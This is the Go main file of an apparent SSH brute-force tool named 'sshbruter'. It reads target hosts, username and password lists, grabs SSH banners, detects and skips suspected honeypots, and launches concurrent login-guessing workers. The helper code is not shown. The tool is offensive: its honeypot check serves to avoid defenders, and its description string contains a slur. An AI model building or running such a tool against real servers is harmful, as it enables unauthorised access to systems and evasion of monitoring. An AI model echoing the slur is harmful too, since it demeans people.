package main

import (
	"fmt"
	"os"
	"runtime"
	"strings"

	"github.com/akamensky/argparse"
)

func main() {
	// Create parser with better help text
	parser := argparse.NewParser("sshbruter", "real ngga bruter")

	// Required arguments
	targetArg := parser.String("t", "target", &argparse.Options{
		Required: true,
		Help:     "Target list file (txt). One target per line. Examples: '192.168.1.1' or '192.168.1.1:2222'",
	})
	userArg := parser.String("u", "user", &argparse.Options{
		Required: true,
		Help:     "Username list (comma-separated). Example: 'admin,root,user'",
	})
	passArg := parser.String("p", "pass", &argparse.Options{
		Required: true,
		Help:     "Password list (comma-separated). Example: 'password,123456,admin'",
	})

	// Optional arguments
	workerArg := parser.Int("w", "workers", &argparse.Options{
		Required: false,
		Help:     "Number of concurrent workers (default: CPU cores * 2)",
		Default:  runtime.NumCPU() * 2,
	})

	// Parse arguments
	err := parser.Parse(os.Args)
	if err != nil {
		// Show help on parse error
		fmt.Println("Error:", err)
		fmt.Println()
		parser.Help(os.Stdout)
		os.Exit(1)
	}

	// Validate required arguments
	if *targetArg == "" || *userArg == "" || *passArg == "" {
		fmt.Println("Error: All required arguments must be provided")
		fmt.Println()
		parser.Help(os.Stdout)
		os.Exit(1)
	}

	// Parse and validate input lists
	targets, err := parseTargetFile(*targetArg)
	if err != nil {
		fmt.Printf("Error reading target file: %v\n", err)
		os.Exit(1)
	}
	users := parseTargets(*userArg)
	passwords := parseTargets(*passArg)

	if len(targets) == 0 || len(users) == 0 || len(passwords) == 0 {
		fmt.Println("Error: All lists must contain at least one item")
		fmt.Println("   Make sure to use comma-separated values")
		fmt.Println()
		parser.Help(os.Stdout)
		os.Exit(1)
	}

	// Validate worker count
	if *workerArg <= 0 {
		fmt.Println("Error: Worker count must be greater than 0")
		os.Exit(1)
	}

	// Show configuration
	fmt.Printf("🚀 SSH Brute Force Tool\n")
	fmt.Printf("📊 Configuration:\n")
	fmt.Printf("   Targets: %d (%s)\n", len(targets), strings.Join(targets, ", "))
	fmt.Printf("   Users: %d (%s)\n", len(users), strings.Join(users, ", "))
	fmt.Printf("   Passwords: %d (%s)\n", len(passwords), strings.Join(passwords, ", "))
	fmt.Printf("   Workers: %d\n", *workerArg)
	fmt.Printf("   Total combinations: %d\n\n", len(targets)*len(users)*len(passwords))

	// Get SSH banners first
	fmt.Println("🔍 Getting SSH banners...")
	banners := getSSHBanners(targets)
	for i, target := range targets {
		fmt.Printf("   %s: %s\n", target, banners[i])
	}

	// Create worker pool with honeypot detection
	pool := NewWorkerPool(*workerArg)
	defer pool.Close()

	// Check for honeypots first
	fmt.Println("\n🍯 Checking for honeypots...")
	honeypotTargets := pool.CheckHoneypots(targets)

	if len(honeypotTargets) > 0 {
		fmt.Println("⚠️  HONEYPOT DETECTED - Skipping the following targets:")
		for target, info := range honeypotTargets {
			fmt.Printf("   %s (confidence: %.1f%%) - %s\n", target, info.Confidence*100, strings.Join(info.Reasons, ", "))
		}
		fmt.Println()
	}

	// Start brute force with worker pool
	fmt.Printf("⚡ Starting brute force with %d workers...\n", *workerArg)
	pool.BruteForceSSH(targets, users, passwords)
}
